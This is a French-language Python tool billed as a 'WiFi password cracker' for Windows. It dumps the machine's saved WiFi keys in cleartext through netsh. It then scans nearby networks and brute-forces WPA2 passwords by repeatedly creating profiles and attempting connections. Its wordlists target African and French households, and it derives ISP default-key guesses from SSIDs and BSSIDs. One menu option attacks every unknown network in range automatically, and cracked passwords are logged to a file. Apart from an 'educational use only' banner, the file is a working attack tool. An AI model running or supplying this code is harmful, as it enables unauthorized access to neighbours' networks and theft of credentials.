#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    📡 WIFI PASSWORD CRACKER v2.0 📡                              ║
║                    Crack des réseaux WiFi WPA/WPA2                               ║
║                    ⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import os
import sys
import time
import itertools
import string
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== COULEURS ====================
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== CONFIGURATION ====================
WORDLIST_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\04_PHISHING_ET_TESTS\HackingTools\wordlists"
RESULTS_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\04_PHISHING_ET_TESTS\HackingTools\wifi_results"

# Créer les dossiers
os.makedirs(WORDLIST_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# ==================== WORDLISTS COMMUNES ====================
# Mots de passe WiFi les plus courants en Afrique/France
COMMON_PASSWORDS = [
    # Patterns numériques simples
    "12345678", "123456789", "1234567890", "00000000", "11111111",
    "22222222", "33333333", "44444444", "55555555", "66666666",
    "77777777", "88888888", "99999999", "12341234", "11223344",
    "87654321", "01234567", "76543210", "11112222", "12121212",
    
    # Dates communes (format divers)
    "01012000", "01012001", "01012020", "01012021", "01012022",
    "01012023", "01012024", "01012025", "20202020", "20212021",
    "20222022", "20232023", "20242024", "20252025", "19901990",
    
    # Mots français courants
    "password", "motdepasse", "internet", "connexion", "bienvenue",
    "bonjour1", "bonsoir1", "famille1", "maison12", "monwifi12",
    "wifimaison", "wifihome", "mywifi123", "wifi1234", "freewifi",
    
    # Noms religieux (très commun en Afrique)
    "jesus123", "jesuschrist", "dieuestbon", "dieumerci", "alleluia",
    "gloire123", "eglise123", "pasteur1", "prophete1", "apotre12",
    "louange12", "priere123", "amen12345", "dieu1234", "christ12",
    "emmanuel", "emmanuel1", "jehovah1", "yahweh12", "seigneur",
    
    # Prénoms africains courants
    "amadou12", "mamadou1", "fatou123", "aissatou1", "moussa123",
    "ibrahim1", "ousmane1", "mariama1", "adama123", "sekou123",
    "koffi123", "kouame12", "adjoua12", "akissi12", "kouadio1",
    
    # Mots en langues locales
    "bismillah", "alhamdou", "inchallah", "machallah", "barakah1",
    "salam123", "paix1234", "amour123", "famille1", "bonheur1",
    
    # Patterns clavier
    "azerty12", "azertyui", "qwerty12", "qwertyui", "abcdefgh",
    "abcd1234", "abc12345", "1q2w3e4r", "1a2b3c4d", "a1b2c3d4",
    
    # Noms de box/FAI courants
    "livebox1", "livebox2", "freebox1", "bbox1234", "orange12",
    "sfr12345", "fiberbox", "fibre123", "internet", "wifi2024",
    
    # Patterns téléphone (Côte d'Ivoire, Sénégal, etc.)
    "07070707", "05050505", "01010101", "77777777", "78787878",
    "70707070", "76767676", "33333333", "22222222", "21212121",
]

# Patterns spécifiques pour les Fiberbox (basés sur le SSID)
FIBERBOX_PATTERNS = [
    # Les Fiberbox utilisent souvent les 8 derniers caractères du BSSID
    # Format: 5bbfXXXX ou 8b2bXXXX
    lambda ssid: ssid.lower().replace("fiberbox-", "").replace("2.4g-", "").replace("5g-", ""),
    lambda ssid: "5bbf" + ssid[-4:] if len(ssid) >= 4 else None,
    lambda ssid: "8b2b" + ssid[-4:] if len(ssid) >= 4 else None,
]

# ==================== FONCTIONS PRINCIPALES ====================

def banner():
    """Affiche la bannière"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{C.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗
║{C.RED}  ██╗    ██╗██╗███████╗██╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗{C.CYAN}            ║
║{C.RED}  ██║    ██║██║██╔════╝██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝{C.CYAN}            ║
║{C.RED}  ██║ █╗ ██║██║█████╗  ██║    ██║     ██████╔╝███████║██║     █████╔╝ {C.CYAN}            ║
║{C.RED}  ██║███╗██║██║██╔══╝  ██║    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ {C.CYAN}            ║
║{C.RED}  ╚███╔███╔╝██║██║     ██║    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗{C.CYAN}            ║
║{C.RED}   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{C.CYAN}            ║
║                                                                                  ║
║{C.YELLOW}                    📡 WIFI PASSWORD CRACKER v2.0 📡{C.CYAN}                              ║
║{C.WHITE}                    Crack des réseaux WiFi WPA/WPA2{C.CYAN}                              ║
╚══════════════════════════════════════════════════════════════════════════════════╝{C.END}
""")

def scan_wifi_networks():
    """Scanne les réseaux WiFi disponibles"""
    print(f"\n{C.CYAN}[*] Scan des réseaux WiFi en cours...{C.END}")
    
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, encoding='cp850'
        )
        
        networks = []
        current_network = {}
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            
            if line.startswith("SSID") and "BSSID" not in line:
                if current_network.get('ssid'):
                    networks.append(current_network)
                ssid = line.split(":", 1)[-1].strip()
                current_network = {'ssid': ssid, 'bssid': '', 'signal': '', 'auth': '', 'channel': ''}
            
            elif "BSSID" in line:
                current_network['bssid'] = line.split(":", 1)[-1].strip()
            
            elif "Signal" in line:
                current_network['signal'] = line.split(":", 1)[-1].strip()
            
            elif "Authentification" in line or "Authentication" in line:
                current_network['auth'] = line.split(":", 1)[-1].strip()
            
            elif "Canal" in line or "Channel" in line:
                current_network['channel'] = line.split(":", 1)[-1].strip()
        
        if current_network.get('ssid'):
            networks.append(current_network)
        
        # Filtrer les réseaux vides
        networks = [n for n in networks if n.get('ssid') and n['ssid'] != '']
        
        return networks
    
    except Exception as e:
        print(f"{C.RED}[!] Erreur lors du scan: {e}{C.END}")
        return []

def get_saved_passwords():
    """Récupère les mots de passe WiFi déjà enregistrés"""
    saved = {}
    
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, encoding='cp850'
        )
        
        profiles = []
        for line in result.stdout.split('\n'):
            if "Profil Tous les utilisateurs" in line or "All User Profile" in line:
                profile = line.split(":")[-1].strip()
                profiles.append(profile)
        
        for profile in profiles:
            try:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    capture_output=True, text=True, encoding='cp850'
                )
                
                for line in result.stdout.split('\n'):
                    if "Contenu de la cl" in line or "Key Content" in line:
                        password = line.split(":")[-1].strip()
                        saved[profile] = password
                        break
            except:
                pass
        
        return saved
    
    except Exception as e:
        print(f"{C.RED}[!] Erreur: {e}{C.END}")
        return {}

def try_connect_wifi(ssid, password, timeout=10):
    """Tente de se connecter à un réseau WiFi avec un mot de passe"""
    
    # Créer un profil XML temporaire
    profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
    
    profile_path = os.path.join(RESULTS_DIR, f"temp_profile_{ssid.replace(' ', '_')}.xml")
    
    try:
        # Écrire le profil
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile_xml)
        
        # Supprimer l'ancien profil si existant
        subprocess.run(
            ["netsh", "wlan", "delete", "profile", f"name={ssid}"],
            capture_output=True, timeout=5
        )
        
        # Ajouter le nouveau profil
        result = subprocess.run(
            ["netsh", "wlan", "add", "profile", f"filename={profile_path}"],
            capture_output=True, text=True, timeout=5
        )
        
        if "est ajout" not in result.stdout and "added" not in result.stdout.lower():
            return False
        
        # Tenter la connexion
        result = subprocess.run(
            ["netsh", "wlan", "connect", f"name={ssid}"],
            capture_output=True, text=True, timeout=5
        )
        
        # Attendre la connexion
        time.sleep(3)
        
        # Vérifier si connecté
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, encoding='cp850', timeout=5
        )
        
        if ssid in result.stdout and ("Connect" in result.stdout or "connect" in result.stdout):
            # Vérifier qu'on a vraiment une IP
            time.sleep(2)
            ip_result = subprocess.run(
                ["ipconfig"],
                capture_output=True, text=True, timeout=5
            )
            
            # Si on a une IP non-APIPA (pas 169.254.x.x), c'est bon
            if "169.254" not in ip_result.stdout or "192.168" in ip_result.stdout or "10." in ip_result.stdout:
                return True
        
        return False
        
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        return False
    finally:
        # Nettoyer
        try:
            os.remove(profile_path)
        except:
            pass

def generate_smart_passwords(ssid, bssid=""):
    """Génère des mots de passe intelligents basés sur le SSID et BSSID"""
    passwords = list(COMMON_PASSWORDS)
    
    ssid_lower = ssid.lower().replace(" ", "").replace("-", "")
    
    # Ajouter des variations du SSID
    passwords.extend([
        ssid_lower,
        ssid_lower + "1",
        ssid_lower + "12",
        ssid_lower + "123",
        ssid_lower + "1234",
        ssid_lower + "12345",
        ssid_lower + "2024",
        ssid_lower + "2025",
        ssid.replace(" ", "") + "1",
        ssid.replace(" ", "") + "123",
    ])
    
    # Pour les Fiberbox, ajouter les patterns spécifiques
    if "fiberbox" in ssid.lower():
        # Extraire le code (ex: CE06 de Fiberbox-2.4G-CE06)
        parts = ssid.split("-")
        if len(parts) >= 3:
            code = parts[-1].lower()
            passwords.extend([
                f"5bbf{code}",
                f"8b2b{code}",
                f"fiberbox{code}",
                code + code,
                code * 2,
            ])
    
    # Si on a le BSSID, l'utiliser
    if bssid:
        bssid_clean = bssid.replace(":", "").lower()
        passwords.extend([
            bssid_clean[-8:],  # 8 derniers caractères
            bssid_clean[-6:] + "00",
            bssid_clean[:8],
        ])
    
    # Patterns pour noms de famille (commun en Afrique)
    if any(word in ssid.lower() for word in ["famille", "family", "maison", "home"]):
        name_part = ssid_lower.replace("famille", "").replace("family", "").replace("maison", "").replace("home", "")
        passwords.extend([
            name_part + "123",
            name_part + "1234",
            name_part + "2024",
            "famille" + name_part[:4] if len(name_part) >= 4 else name_part,
        ])
    
    # Patterns religieux
    if any(word in ssid.lower() for word in ["jesus", "dieu", "god", "christ", "eglise", "juda", "lion"]):
        passwords.extend([
            "jesus2024", "dieu2024", "eglise123", "louange12", 
            "gloire123", "alleluia1", "amen12345", "priere123",
            "lionjuda1", "liondejuda", "juda12345",
        ])
    
    # Supprimer les doublons et les mots de passe trop courts (< 8 caractères)
    passwords = list(dict.fromkeys([p for p in passwords if len(p) >= 8]))
    
    return passwords

def crack_wifi_network(ssid, bssid="", max_attempts=500):
    """Tente de craquer un réseau WiFi"""
    
    print(f"\n{C.YELLOW}{'='*70}{C.END}")
    print(f"{C.CYAN}[*] Cible: {C.WHITE}{ssid}{C.END}")
    print(f"{C.CYAN}[*] BSSID: {C.WHITE}{bssid if bssid else 'N/A'}{C.END}")
    print(f"{C.YELLOW}{'='*70}{C.END}")
    
    # Générer la liste de mots de passe
    passwords = generate_smart_passwords(ssid, bssid)
    print(f"{C.CYAN}[*] {len(passwords)} mots de passe à tester{C.END}")
    
    found_password = None
    attempts = 0
    start_time = time.time()
    
    for password in passwords[:max_attempts]:
        attempts += 1
        
        # Afficher la progression
        progress = (attempts / min(len(passwords), max_attempts)) * 100
        sys.stdout.write(f"\r{C.YELLOW}[{progress:5.1f}%] Tentative {attempts}/{min(len(passwords), max_attempts)}: {password[:20]:20s}{C.END}")
        sys.stdout.flush()
        
        # Tester le mot de passe
        if try_connect_wifi(ssid, password):
            found_password = password
            break
    
    elapsed = time.time() - start_time
    print()  # Nouvelle ligne après la barre de progression
    
    if found_password:
        print(f"\n{C.GREEN}{'='*70}{C.END}")
        print(f"{C.GREEN}[✓] MOT DE PASSE TROUVÉ !{C.END}")
        print(f"{C.GREEN}[✓] Réseau: {ssid}{C.END}")
        print(f"{C.GREEN}[✓] Mot de passe: {found_password}{C.END}")
        print(f"{C.GREEN}[✓] Tentatives: {attempts}{C.END}")
        print(f"{C.GREEN}[✓] Temps: {elapsed:.1f} secondes{C.END}")
        print(f"{C.GREEN}{'='*70}{C.END}")
        
        # Sauvegarder le résultat
        save_result(ssid, bssid, found_password, attempts, elapsed)
        
        return found_password
    else:
        print(f"\n{C.RED}[✗] Mot de passe non trouvé après {attempts} tentatives{C.END}")
        print(f"{C.RED}[✗] Temps écoulé: {elapsed:.1f} secondes{C.END}")
        return None

def save_result(ssid, bssid, password, attempts, elapsed):
    """Sauvegarde le résultat du crack"""
    
    result_file = os.path.join(RESULTS_DIR, "cracked_passwords.txt")
    
    with open(result_file, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"SSID: {ssid}\n")
        f.write(f"BSSID: {bssid}\n")
        f.write(f"Mot de passe: {password}\n")
        f.write(f"Tentatives: {attempts}\n")
        f.write(f"Temps: {elapsed:.1f}s\n")
        f.write(f"{'='*50}\n")
    
    print(f"{C.CYAN}[*] Résultat sauvegardé dans: {result_file}{C.END}")

def display_networks(networks, saved_passwords):
    """Affiche les réseaux avec leur statut"""
    
    print(f"\n{C.CYAN}┌{'─'*70}┐{C.END}")
    print(f"{C.CYAN}│{C.YELLOW}{'RÉSEAUX WIFI DÉTECTÉS':^70}{C.CYAN}│{C.END}")
    print(f"{C.CYAN}├{'─'*70}┤{C.END}")
    print(f"{C.CYAN}│ {C.WHITE}{'#':3} {'SSID':25} {'Signal':8} {'Sécurité':15} {'Statut':15}{C.CYAN}│{C.END}")
    print(f"{C.CYAN}├{'─'*70}┤{C.END}")
    
    for i, network in enumerate(networks, 1):
        ssid = network.get('ssid', 'N/A')[:24]
        signal = network.get('signal', 'N/A')[:7]
        auth = network.get('auth', 'N/A')[:14]
        
        if ssid in saved_passwords:
            status = f"{C.GREEN}✓ Connu{C.END}"
            password_hint = f" [{saved_passwords[ssid][:8]}...]"
        else:
            status = f"{C.RED}? Inconnu{C.END}"
            password_hint = ""
        
        print(f"{C.CYAN}│ {C.WHITE}{i:3} {ssid:25} {signal:8} {auth:15} {status}{password_hint:15}{C.CYAN}│{C.END}")
    
    print(f"{C.CYAN}└{'─'*70}┘{C.END}")

def bruteforce_numeric(ssid, length=8):
    """Attaque bruteforce avec des chiffres uniquement"""
    
    print(f"\n{C.YELLOW}[*] Bruteforce numérique ({length} chiffres) sur {ssid}{C.END}")
    print(f"{C.YELLOW}[*] Cela peut prendre TRÈS longtemps...{C.END}")
    
    attempts = 0
    start_time = time.time()
    
    # Générer les combinaisons
    for combo in itertools.product('0123456789', repeat=length):
        password = ''.join(combo)
        attempts += 1
        
        if attempts % 100 == 0:
            elapsed = time.time() - start_time
            speed = attempts / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r{C.YELLOW}[*] Tentative {attempts}: {password} ({speed:.0f}/s){C.END}")
            sys.stdout.flush()
        
        if try_connect_wifi(ssid, password):
            print(f"\n{C.GREEN}[✓] TROUVÉ: {password}{C.END}")
            save_result(ssid, "", password, attempts, time.time() - start_time)
            return password
    
    print(f"\n{C.RED}[✗] Non trouvé après {attempts} tentatives{C.END}")
    return None

def create_custom_wordlist():
    """Crée une wordlist personnalisée"""
    
    print(f"\n{C.CYAN}[*] Création d'une wordlist personnalisée{C.END}")
    
    words = []
    
    print(f"{C.YELLOW}Entrez des mots de base (un par ligne, 'done' pour terminer):{C.END}")
    while True:
        word = input(f"{C.GREEN}> {C.END}").strip()
        if word.lower() == 'done':
            break
        if word:
            words.append(word)
    
    if not words:
        print(f"{C.RED}[!] Aucun mot entré{C.END}")
        return []
    
    # Générer des variations
    variations = []
    
    for word in words:
        variations.append(word)
        variations.append(word.lower())
        variations.append(word.upper())
        variations.append(word.capitalize())
        
        # Ajouter des chiffres
        for suffix in ['1', '12', '123', '1234', '2024', '2025', '!', '@', '#']:
            variations.append(word + suffix)
            variations.append(word.capitalize() + suffix)
        
        # Substitutions l33t
        leet = word.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
        variations.append(leet)
        variations.append(leet + '123')
    
    # Filtrer (min 8 caractères)
    variations = list(dict.fromkeys([v for v in variations if len(v) >= 8]))
    
    # Sauvegarder
    wordlist_file = os.path.join(WORDLIST_DIR, "custom_wordlist.txt")
    with open(wordlist_file, 'w', encoding='utf-8') as f:
        for v in variations:
            f.write(v + '\n')
    
    print(f"{C.GREEN}[✓] {len(variations)} mots de passe générés{C.END}")
    print(f"{C.GREEN}[✓] Sauvegardé dans: {wordlist_file}{C.END}")
    
    return variations

def main_menu():
    """Menu principal"""
    
    while True:
        banner()
        
        print(f"""
{C.CYAN}┌────────────────────────────────────────────────────────────────────┐
│  {C.YELLOW}📋 MENU PRINCIPAL{C.CYAN}                                                 │
├────────────────────────────────────────────────────────────────────┤
│  {C.WHITE}[1]{C.END} 📡 Scanner les réseaux WiFi                                  {C.CYAN}│
│  {C.WHITE}[2]{C.END} 🔑 Voir les mots de passe enregistrés                        {C.CYAN}│
│  {C.WHITE}[3]{C.END} 💥 Attaque dictionnaire (smart)                              {C.CYAN}│
│  {C.WHITE}[4]{C.END} 🔢 Attaque bruteforce numérique                              {C.CYAN}│
│  {C.WHITE}[5]{C.END} 📝 Créer une wordlist personnalisée                          {C.CYAN}│
│  {C.WHITE}[6]{C.END} 🎯 Attaque ciblée (choisir le réseau)                        {C.CYAN}│
│  {C.WHITE}[7]{C.END} 📊 Voir les résultats précédents                             {C.CYAN}│
├────────────────────────────────────────────────────────────────────┤
│  {C.WHITE}[0]{C.END} 🚪 Quitter                                                   {C.CYAN}│
└────────────────────────────────────────────────────────────────────┘{C.END}
""")
        
        choice = input(f"{C.GREEN}👉 Choix: {C.END}").strip()
        
        if choice == '1':
            networks = scan_wifi_networks()
            saved = get_saved_passwords()
            display_networks(networks, saved)
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '2':
            saved = get_saved_passwords()
            print(f"\n{C.CYAN}┌{'─'*60}┐{C.END}")
            print(f"{C.CYAN}│{C.YELLOW}{'MOTS DE PASSE WIFI ENREGISTRÉS':^60}{C.CYAN}│{C.END}")
            print(f"{C.CYAN}├{'─'*60}┤{C.END}")
            
            for ssid, password in saved.items():
                print(f"{C.CYAN}│ {C.WHITE}{ssid:30} {C.GREEN}{password:26}{C.CYAN}│{C.END}")
            
            print(f"{C.CYAN}└{'─'*60}┘{C.END}")
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '3':
            networks = scan_wifi_networks()
            saved = get_saved_passwords()
            
            # Filtrer les réseaux non connus
            unknown = [n for n in networks if n.get('ssid') not in saved and n.get('ssid')]
            
            if not unknown:
                print(f"{C.YELLOW}[*] Tous les réseaux visibles sont déjà connus!{C.END}")
            else:
                print(f"\n{C.CYAN}[*] Réseaux inconnus à attaquer:{C.END}")
                for i, n in enumerate(unknown, 1):
                    print(f"  {i}. {n.get('ssid')} ({n.get('signal')})")
                
                for network in unknown:
                    crack_wifi_network(network.get('ssid'), network.get('bssid', ''))
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '4':
            networks = scan_wifi_networks()
            print(f"\n{C.CYAN}[*] Réseaux disponibles:{C.END}")
            for i, n in enumerate(networks, 1):
                print(f"  {i}. {n.get('ssid')}")
            
            idx = input(f"\n{C.GREEN}Numéro du réseau: {C.END}").strip()
            try:
                network = networks[int(idx) - 1]
                length = input(f"{C.GREEN}Longueur du mot de passe (8): {C.END}").strip() or "8"
                bruteforce_numeric(network.get('ssid'), int(length))
            except:
                print(f"{C.RED}[!] Choix invalide{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '5':
            create_custom_wordlist()
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '6':
            networks = scan_wifi_networks()
            saved = get_saved_passwords()
            display_networks(networks, saved)
            
            idx = input(f"\n{C.GREEN}Numéro du réseau à attaquer: {C.END}").strip()
            try:
                network = networks[int(idx) - 1]
                crack_wifi_network(network.get('ssid'), network.get('bssid', ''))
            except:
                print(f"{C.RED}[!] Choix invalide{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '7':
            result_file = os.path.join(RESULTS_DIR, "cracked_passwords.txt")
            if os.path.exists(result_file):
                print(f"\n{C.CYAN}[*] Résultats précédents:{C.END}")
                with open(result_file, 'r', encoding='utf-8') as f:
                    print(f.read())
            else:
                print(f"{C.YELLOW}[*] Aucun résultat encore{C.END}")
            
            input(f"\n{C.YELLOW}Appuyez sur Entrée pour continuer...{C.END}")
        
        elif choice == '0':
            print(f"\n{C.CYAN}[*] Au revoir!{C.END}")
            break

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Interruption...{C.END}")
    except Exception as e:
        print(f"{C.RED}[!] Erreur: {e}{C.END}")
